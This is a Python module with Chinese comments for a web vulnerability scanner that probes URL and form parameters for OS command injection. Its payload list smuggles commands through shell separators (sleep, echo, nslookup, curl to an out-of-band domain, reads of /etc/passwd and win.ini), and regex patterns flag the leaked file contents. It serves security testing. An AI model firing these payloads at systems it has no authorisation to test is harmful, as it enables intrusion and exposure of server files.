"""WVS v17.0 - 命令注入扫描器

支持 OS 命令注入检测，包括 Unix/Linux 和 Windows
"""
import asyncio
import re
import time
from typing import List, Dict, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode
from dataclasses import dataclass
from enum import Enum

try:
    import aiohttp
except ImportError:
    aiohttp = None


class OSType(Enum):
    UNIX = "unix"
    WINDOWS = "windows"
    UNKNOWN = "unknown"


@dataclass
class CommandiResult:
    vulnerable: bool
    parameter: str
    payload: str
    os_type: OSType
    command_executed: str
    evidence: str
    confidence: float
    blind: bool = False


# 命令注入 Payload 库
COMMANDI_PAYLOADS = {
    "unix": {
        "time_based": [
            "; sleep 5",
            "| sleep 5",
            "|| sleep 5",
            "&& sleep 5",
            "& sleep 5",
            "$(sleep 5)",
            "`sleep 5`",
            "\n sleep 5",
            "\r\n sleep 5",
        ],
        "echo_based": [
            "; echo 'CMDI_TEST_12345'",
            "| echo 'CMDI_TEST_12345'",
            "&& echo 'CMDI_TEST_12345'",
            "& echo 'CMDI_TEST_12345'",
            "$(echo 'CMDI_TEST_12345')",
            "`echo 'CMDI_TEST_12345'`",
            "' echo 'CMDI_TEST_12345'",
            "\" echo 'CMDI_TEST_12345'",
        ],
        "dns_oob": [
            "; nslookup {domain}",
            "| nslookup {domain}",
            "$(nslookup {domain})",
            "`nslookup {domain}`",
            "&& curl http://{domain}",
        ],
        "file_based": [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "; head -n 1 /etc/passwd",
        ],
    },
    "windows": {
        "time_based": [
            "& timeout 5",
            "| timeout 5",
            "&& timeout 5",
            "& ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
        ],
        "echo_based": [
            "& echo CMDI_TEST_12345",
            "| echo CMDI_TEST_12345",
            "&& echo CMDI_TEST_12345",
            "^& echo CMDI_TEST_12345",
        ],
        "dns_oob": [
            "& nslookup {domain}",
            "| nslookup {domain}",
            "&& nslookup {domain}",
        ],
        "file_based": [
            "& type C:\\Windows\\win.ini",
            "| type C:\\Windows\\win.ini",
            "& type C:\\boot.ini",
        ],
    },
}

# 检测特征
EVIDENCE_PATTERNS = {
    "unix_passwd": [
        r"root:[x*]:0:0:",
        r"daemon:[x*]:1:1:",
        r"nobody:[x*]:",
        r"/bin/(ba)?sh",
        r"/usr/sbin/nologin",
    ],
    "windows_ini": [
        r"\[fonts\]",
        r"\[extensions\]",
        r"\[Mail\]",
        r"MAPI=1",
    ],
    "echo_marker": [
        r"CMDI_TEST_12345",
    ],
}


class CommandiScannerV17:
    """命令注入扫描器 v17.0"""
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.timeout = self.config.get("timeout", 10)
        self.time_threshold = self.config.get("time_threshold", 5)
        self.oob_domain = self.config.get("oob_domain", "burpcollaborator.net")
    
    async def scan(
        self,
        url: str,
        method: str = "GET",
        params: Dict[str, str] = None,
        data: Dict[str, str] = None,
        headers: Dict[str, str] = None,
        cookies: Dict[str, str] = None
    ) -> List[CommandiResult]:
        """扫描命令注入"""
        results = []
        
        params = params or {}
        data = data or {}
        all_params = {**params, **data}
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
            for param, value in all_params.items():
                # 时间盲注检测
                time_result = await self._test_time_based(
                    session, url, method, param, value, params, data, headers, cookies
                )
                if time_result:
                    results.append(time_result)
                    continue
                
                # 回显检测
                echo_result = await self._test_echo_based(
                    session, url, method, param, value, params, data, headers, cookies
                )
                if echo_result:
                    results.append(echo_result)
                    continue
                
                # 文件读取检测
                file_result = await self._test_file_based(
                    session, url, method, param, value, params, data, headers, cookies
                )
                if file_result:
                    results.append(file_result)
        
        return results
    
    async def _test_time_based(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        original_value: str,
        params: Dict,
        data: Dict,
        headers: Dict,
        cookies: Dict
    ) -> Optional[CommandiResult]:
        """时间盲注检测"""
        
        # 测试 Unix
        for payload in COMMANDI_PAYLOADS["unix"]["time_based"]:
            start = time.time()
            
            try:
                await self._send_request(
                    session, url, method, param, payload, params, data, headers, cookies
                )
            except:
                pass
            
            elapsed = time.time() - start
            
            if elapsed >= self.time_threshold:
                return CommandiResult(
                    vulnerable=True,
                    parameter=param,
                    payload=payload,
                    os_type=OSType.UNIX,
                    command_executed="sleep 5",
                    evidence=f"响应延迟 {elapsed:.2f}s (阈值 {self.time_threshold}s)",
                    confidence=0.9,
                    blind=True
                )
        
        # 测试 Windows
        for payload in COMMANDI_PAYLOADS["windows"]["time_based"]:
            start = time.time()
            
            try:
                await self._send_request(
                    session, url, method, param, payload, params, data, headers, cookies
                )
            except:
                pass
            
            elapsed = time.time() - start
            
            if elapsed >= self.time_threshold:
                return CommandiResult(
                    vulnerable=True,
                    parameter=param,
                    payload=payload,
                    os_type=OSType.WINDOWS,
                    command_executed="timeout 5",
                    evidence=f"响应延迟 {elapsed:.2f}s (阈值 {self.time_threshold}s)",
                    confidence=0.9,
                    blind=True
                )
        
        return None
    
    async def _test_echo_based(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        original_value: str,
        params: Dict,
        data: Dict,
        headers: Dict,
        cookies: Dict
    ) -> Optional[CommandiResult]:
        """回显检测"""
        
        marker = "CMDI_TEST_12345"
        
        # 测试 Unix
        for payload in COMMANDI_PAYLOADS["unix"]["echo_based"]:
            try:
                response_text = await self._send_request(
                    session, url, method, param, payload, params, data, headers, cookies
                )
                
                if marker in response_text:
                    return CommandiResult(
                        vulnerable=True,
                        parameter=param,
                        payload=payload,
                        os_type=OSType.UNIX,
                        command_executed=f"echo {marker}",
                        evidence=f"在响应中发现标记: {marker}",
                        confidence=0.95
                    )
            except:
                pass
        
        # 测试 Windows
        for payload in COMMANDI_PAYLOADS["windows"]["echo_based"]:
            try:
                response_text = await self._send_request(
                    session, url, method, param, payload, params, data, headers, cookies
                )
                
                if marker in response_text:
                    return CommandiResult(
                        vulnerable=True,
                        parameter=param,
                        payload=payload,
                        os_type=OSType.WINDOWS,
                        command_executed=f"echo {marker}",
                        evidence=f"在响应中发现标记: {marker}",
                        confidence=0.95
                    )
            except:
                pass
        
        return None
    
    async def _test_file_based(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        original_value: str,
        params: Dict,
        data: Dict,
        headers: Dict,
        cookies: Dict
    ) -> Optional[CommandiResult]:
        """文件读取检测"""
        
        # 测试 Unix /etc/passwd
        for payload in COMMANDI_PAYLOADS["unix"]["file_based"]:
            try:
                response_text = await self._send_request(
                    session, url, method, param, payload, params, data, headers, cookies
                )
                
                for pattern in EVIDENCE_PATTERNS["unix_passwd"]:
                    if re.search(pattern, response_text):
                        return CommandiResult(
                            vulnerable=True,
                            parameter=param,
                            payload=payload,
                            os_type=OSType.UNIX,
                            command_executed="cat /etc/passwd",
                            evidence=f"发现 /etc/passwd 内容特征: {pattern}",
                            confidence=0.95
                        )
            except:
                pass
        
        # 测试 Windows 文件
        for payload in COMMANDI_PAYLOADS["windows"]["file_based"]:
            try:
                response_text = await self._send_request(
                    session, url, method, param, payload, params, data, headers, cookies
                )
                
                for pattern in EVIDENCE_PATTERNS["windows_ini"]:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        return CommandiResult(
                            vulnerable=True,
                            parameter=param,
                            payload=payload,
                            os_type=OSType.WINDOWS,
                            command_executed="type win.ini",
                            evidence=f"发现 Windows 文件内容特征: {pattern}",
                            confidence=0.95
                        )
            except:
                pass
        
        return None
    
    async def _send_request(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        payload: str,
        params: Dict,
        data: Dict,
        headers: Dict,
        cookies: Dict
    ) -> str:
        """发送请求"""
        
        # 构建参数
        test_params = params.copy()
        test_data = data.copy()
        
        if param in test_params:
            test_params[param] = payload
        elif param in test_data:
            test_data[param] = payload
        
        # 发送请求
        if method.upper() == "GET":
            async with session.get(
                url, 
                params=test_params, 
                headers=headers, 
                cookies=cookies
            ) as resp:
                return await resp.text()
        else:
            async with session.request(
                method,
                url,
                params=test_params,
                data=test_data,
                headers=headers,
                cookies=cookies
            ) as resp:
                return await resp.text()
    
    def generate_report(self, results: List[CommandiResult]) -> Dict:
        """生成报告"""
        return {
            "vulnerabilities": [
                {
                    "type": "OS Command Injection",
                    "parameter": r.parameter,
                    "payload": r.payload,
                    "os_type": r.os_type.value,
                    "blind": r.blind,
                    "confidence": r.confidence,
                    "evidence": r.evidence,
                    "severity": "Critical" if not r.blind else "High"
                }
                for r in results
            ],
            "summary": {
                "total": len(results),
                "critical": sum(1 for r in results if not r.blind),
                "high": sum(1 for r in results if r.blind),
            }
        }
